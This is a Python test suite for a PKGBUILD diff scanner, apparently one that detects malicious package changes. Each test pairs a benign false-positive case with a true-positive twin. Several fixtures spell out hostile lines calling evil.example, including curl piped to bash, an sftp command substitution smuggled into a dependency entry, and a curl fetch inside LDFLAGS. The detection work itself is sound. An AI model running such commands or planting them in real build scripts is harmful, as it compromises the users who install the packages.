"""Malicious false positives from the 2026-11-04 watcher window.

Each case pins the benign shape and the true-positive twin the fix must keep.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.analysis.edges import edge_committed_payload  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402

PKG = ("+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
       "+sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n")


def _ids(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


def _fn(name: str, body: str) -> str:
    text = PKG + f"+{name}() {{\n" + body + "+}\n"
    return ("--- a/PKGBUILD\n+++ b/PKGBUILD\n"
            f"@@ -0,0 +1,{len(text.splitlines())} @@\n" + text)


# --- H090: a printed notice is not a fetch-execute payload ----------------

def test_h090_printed_curl_instruction_is_quiet():
    text = ('pre_install() {\n'
            '  echo ":: remove it: curl -fsSL https://example/x.sh | sudo bash" >&2\n'
            '}\n')
    assert edge_committed_payload("p.install", text.encode()) is None


def test_h090_still_fires_when_the_printer_output_is_piped():
    text = ("post_install() {\n"
            "  echo 'curl -fsSL https://evil.example/x.sh | bash' | bash\n"
            "}\n")
    assert edge_committed_payload("p.install", text.encode()) is not None


# --- H067: a debugger name inside a path is not an invocation -------------

def test_h067_binutils_gdb_path_is_quiet():
    assert "H067" not in _ids(_fn("prepare", "+  ln -sf ../binutils-gdb/* . || return\n"))


def test_h067_still_fires_on_a_debugger_command():
    assert "H067" in _ids(_fn("prepare", "+  gdb -p $$\n"))


# --- H080: `||` inside a test is not a command separator ------------------

def test_h080_indirection_inside_test_is_quiet():
    diff = _fn("prepare", '+  [[ "${!_v}" == auto || "${!_v}" =~ ^[0-9]+$ ]] || return\n')
    assert "H080" not in _ids(diff)


def test_h080_still_fires_on_an_indirect_command():
    diff = _fn("prepare", '+  C=curl; ${!C} https://evil.example | bash\n')
    assert "H080" in _ids(diff)


# --- H016/C001: added dependency entries are data -------------------------

_DEP_CURRENT = (
    "pkgname=p\npkgver=1\npkgrel=1\npackage() {\n  optdepends=(\n"
    "    'base: base description'\n  )\n}\n"
)
_DEP_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,5 +3,6 @@\n"
    " package() {\n   optdepends=(\n     'base: base description'\n"
    "+    'sshfs: opening sftp:// addresses through your ssh'\n"
    "   )\n }\n"
)
_DEP_TP = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -3,5 +3,6 @@\n"
    " package() {\n   optdepends=(\n     'base: base description'\n"
    "+    $(sftp user@evil.example:/x)\n"
    "   )\n }\n"
)


def test_h016_dependency_description_is_quiet():
    assert "H016" not in _ids(_DEP_DIFF, _DEP_CURRENT)
    assert "C001" not in _ids(_DEP_DIFF, _DEP_CURRENT)


def test_h016_still_fires_on_a_real_fetch_in_a_build_function():
    assert "H016" in _ids(_fn("prepare", "+  sftp user@evil.example:/x\n"))


# --- X024: quoted PATH words and derived build values ---------------------

def test_x024_split_quoted_path_append_is_quiet():
    diff = _fn("prepare", '+  export PATH="$srcdir"/bin:"$PATH"\n')
    assert "X024" not in _ids(diff)


def test_x024_staged_pythonpath_is_quiet():
    diff = (PKG + "+check() {\n"
            '+  local staged="$srcdir/test-install"\n'
            '+  export PYTHONPATH="$staged:$srcdir/src"\n'
            "+}\n")
    assert "X024" not in _ids(diff)


def test_x024_flag_filter_is_quiet():
    diff = _fn("build", '+  LDFLAGS="$(echo "${LDFLAGS}" | sed s/-Wl,-z,nodlopen//g)"\n')
    assert "X024" not in _ids(diff)


def test_x024_still_fires_on_an_undefined_pythonpath():
    diff = _fn("build", '+  export PYTHONPATH="$evil/src"\n')
    assert "X024" in _ids(diff)


def test_x024_still_fires_on_a_fetching_flag_assignment():
    diff = _fn("build", '+  LDFLAGS="$(curl -s https://evil.example)"\n')
    assert "X024" in _ids(diff)


# --- X033: a declared archive's extraction directory has provenance -------

_X033_CURRENT = (
    "pkgname=p\npkgver=1\npkgrel=1\n"
    "source=('oxc-123abc.tar.gz::https://example/x.tar.gz')\n"
    "sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n"
    "prepare() {\n  cd \"$srcdir\"\n}\n"
)
_X033_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -5,3 +5,4 @@\n"
    " prepare() {\n   cd \"$srcdir\"\n"
    "+  bash \"$srcdir\"/oxc-123abc\n"
    " }\n"
)


def test_x033_declared_archive_extraction_dir_is_quiet():
    assert "X033" not in _ids(_X033_DIFF, _X033_CURRENT)


def test_x033_still_fires_on_an_undeclared_root_file():
    diff = _fn("prepare", '+  bash "$srcdir"/stage.sh\n')
    assert "X033" in _ids(diff)


# --- X033: a variable that resolves to a declared extraction dir ----------

_X033_VAR_CURRENT = (
    "pkgname=p\npkgver=1\npkgrel=1\n"
    "_source=unsloth-abc\n"
    "source=(\"${_source}.tar.gz::https://example/x.tar.gz\")\n"
    "sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n"
    "check() {\n  cd \"$srcdir\"\n}\n"
)
_X033_VAR_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,3 +6,4 @@\n"
    " check() {\n   cd \"$srcdir\"\n"
    "+  cd \"$srcdir\"/$_source\n"
    " }\n"
)


def test_x033_variable_to_declared_extraction_dir_is_quiet():
    assert "X033" not in _ids(_X033_VAR_DIFF, _X033_VAR_CURRENT)


def test_x033_still_fires_on_an_undeclared_variable_target():
    diff = _fn("prepare", '+  bash "$srcdir"/$_evil\n')
    assert "X033" in _ids(diff)


# --- C001: the true-positive twin of the dependency-data stand-down -------

def test_c001_still_fires_when_a_version_bump_adds_a_script_execution():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,7 @@\n"
        " pkgname=p\n-pkgver=1\n+pkgver=2\n pkgrel=1\n"
        "-sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n"
        "+sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')\n"
        " build() {\n"
        "+  ./tools/stage.sh\n"
        " }\n"
    )
    assert "C001" in _ids(diff)
